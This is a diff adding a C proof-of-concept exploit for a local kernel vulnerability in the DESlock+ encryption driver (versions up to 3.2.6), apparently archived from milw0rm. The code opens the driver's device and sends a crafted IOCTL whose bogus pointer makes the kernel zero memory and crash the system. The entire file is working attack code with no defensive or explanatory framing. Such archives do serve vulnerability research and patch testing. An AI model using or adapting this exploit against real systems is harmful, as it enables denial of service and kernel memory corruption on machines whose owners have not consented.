@@ -1,0 +1,73 @@
+/* deslock-list-zero.c
+ *
+ * Copyright (c) 2008 by <mu-b@digit-labs.org>
+ *
+ * DESlock+ <= 3.2.6 local kernel ring0 link list zero POC
+ * by mu-b - Fri 21 Dec 2007
+ *
+ * - Tested on: DLMFENC.sys 1.0.0.26
+ *
+ *    - Private Source Code -DO NOT DISTRIBUTE -
+ * http://www.digit-labs.org/ -- Digit-Labs 2008!@$!
+ */
+
+#include <stdio.h>
+#include <stdlib.h>
+
+#include <windows.h>
+
+#define DLMFENC_IOCTL 0x0FA4204C
+#define DLMFENC_FLAG  0xDEADBEEF
+#define ZERO_MEM      0xDEADBEEF
+
+#define ARG_SIZE(a)   ((a-(sizeof (int)*2))/sizeof (void *))
+
+struct ioctl_req {
+  int flag;
+  int req_num;
+  void *arg[ARG_SIZE(0x20)];
+};
+
+int
+main (int argc, char **argv)
+{
+  struct ioctl_req req;
+  HANDLE hFile;
+  BOOL result;
+  DWORD rlen;
+
+  printf ("DESlock+ <= 3.2.6 local kernel ring0 link list zero PoC\n"
+          "by: <mu-b@digit-labs.org>\n"
+          "http://www.digit-labs.org/ -- Digit-Labs 2008!@$!\n\n");
+
+  fflush (stdout);
+  hFile = CreateFileA ("\\\\.\\DLKPFSD_Device", FILE_EXECUTE,
+                       FILE_SHARE_READ|FILE_SHARE_WRITE, NULL,
+                       OPEN_EXISTING, 0, NULL);
+  if (hFile == INVALID_HANDLE_VALUE)
+    {
+      fprintf (stderr, "* CreateFileA failed, %d\n", hFile);
+      exit (EXIT_FAILURE);
+    }
+
+  memset (&req, 0, sizeof req);
+  req.flag = DLMFENC_FLAG;
+  req.req_num = 4;
+  req.arg[0] = (void *) ZERO_MEM;
+
+  result = DeviceIoControl (hFile, DLMFENC_IOCTL,
+                            &req, sizeof req, &req, sizeof req, &rlen, 0);
+  if (!result)
+    {
+      fprintf (stderr, "* DeviceIoControl failed\n");
+      exit (EXIT_FAILURE);
+    }
+
+  printf ("* hmmm, you didn't STOP the box?!?! rlen: %d\n", rlen);
+
+  CloseHandle (hFile);
+
+  return (EXIT_SUCCESS);
+}
+
+// milw0rm.com [2008-02-18]
